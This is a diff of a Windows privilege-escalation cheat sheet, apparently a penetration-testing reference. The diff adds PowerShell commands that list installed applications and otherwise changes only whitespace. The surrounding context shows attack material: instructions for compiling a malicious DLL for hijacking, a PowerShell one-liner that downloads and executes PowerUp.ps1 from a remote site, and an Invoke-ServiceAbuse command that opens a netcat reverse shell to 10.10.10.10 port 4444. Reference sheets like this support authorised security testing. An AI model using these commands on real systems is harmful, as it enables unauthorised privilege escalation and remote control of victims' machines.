@@ -93,6 +93,16 @@ wmic logicaldisk get caption,description,providername
 Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
 ```
 
+## Applications Enumeration
+
+```powershell
+# list 32-bit apps installed
+Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+
+# list 64-bit apps installed
+Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+```
+
 ### User Enumeration
 
 Get current username
@@ -614,11 +624,11 @@ Often, services are pointing to writeable locations:
     # find missing DLL 
     - Find-PathDLLHijack PowerUp.ps1
     - Process Monitor : check for "Name Not Found"
-
+    
     # compile a malicious dll
     - For x64 compile with: "x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll"
     - For x86 compile with: "i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll"
-
+    
     # content of windows_dll.c
     #include <windows.h>
     BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
@@ -634,7 +644,7 @@ Often, services are pointing to writeable locations:
     ```powershell
     $ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
     $ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"
-
+    
     $ sc query state=all | findstr "SERVICE_NAME:" >> Servicenames.txt
     FOR /F %i in (Servicenames.txt) DO echo %i
     type Servicenames.txt
@@ -763,7 +773,7 @@ gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Whe
     ```powershell
     # find the vulnerable application
     C:\> powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1'); Invoke-AllChecks"
-
+    
     ...
     [*] Checking for unquoted service paths...
     ServiceName   : BBSvc
@@ -771,7 +781,7 @@ gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Whe
     StartName     : LocalSystem
     AbuseFunction : Write-ServiceBinary -ServiceName 'BBSvc' -Path <HijackPath>
     ...
-
+    
     # automatic exploit
     Invoke-ServiceAbuse -Name [SERVICE_NAME] -Command "..\..\Users\Public\nc.exe 10.10.10.10 4444 -e cmd.exe"
     ```
